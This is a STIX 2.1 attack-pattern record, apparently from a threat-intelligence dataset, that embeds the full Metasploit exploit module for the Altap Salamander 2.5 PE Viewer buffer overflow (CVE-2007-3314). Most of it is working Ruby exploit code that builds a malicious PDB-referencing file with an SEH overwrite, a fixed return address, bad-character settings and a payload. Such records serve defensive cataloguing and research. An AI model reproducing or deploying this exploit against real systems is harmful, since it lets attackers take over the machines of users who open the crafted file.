{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--484d3b8b-41c4-4c07-8f7e-4a9866711d77",
    "created": "2024-08-14T16:36:24.497784Z",
    "modified": "2024-08-14T16:36:24.497788Z",
    "name": "Altap Salamander 2.5 PE Viewer Buffer Overflow",
    "description": " This module exploits a buffer overflow in Altap Salamander <= v2.5. By creating a malicious file and convincing a user to view the file with the Portable Executable Viewer plugin within a vulnerable version of Salamander, the PDB file string is copied onto the stack and the SEH can be overwritten.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/altap_salamander_pdb.rb",
            "external_id": "altap_salamander_pdb.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3314"
        },
        {
            "source_name": "reference",
            "url": "http://vuln.sg/salamander25-en.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Altap Salamander 2.5 PE Viewer Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Altap Salamander <= v2.5.\n          By creating a malicious file and convincing a user to view the file with\n          the Portable Executable Viewer plugin within a vulnerable version of\n          Salamander, the PDB file string is copied onto the stack and the\n          SEH can be overwritten.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'aushack' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-3314' ],\n          [ 'BID', '24557' ],\n          [ 'OSVDB', '37579' ],\n          [ 'URL', 'http://vuln.sg/salamander25-en.html' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0d\\x0a=:\\\\/%$^&*\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Universal Salamander 2.5', { 'Ret' => 0x23920b59 } ], # pop ebx; pop eax; ret salrtl.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2007-06-19',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ false, 'The file name.',  'msf-salamander-pdb.exe'])\n        ])\n\n  end\n\n  def exploit\n\n    seh = generate_seh_payload(target.ret)\n\n    # load the static pdb file beginning\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2007-3314.dat\")\n    fd = File.open(path, \"rb\")\n    sploit = fd.read(fd.stat.size)\n    fd.close\n\n    sploit << rand_text_alphanumeric(1098) + seh\n    sploit << \".pdb\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-06-19",
    "x_mitre_platforms": [
        "win'"
    ]
}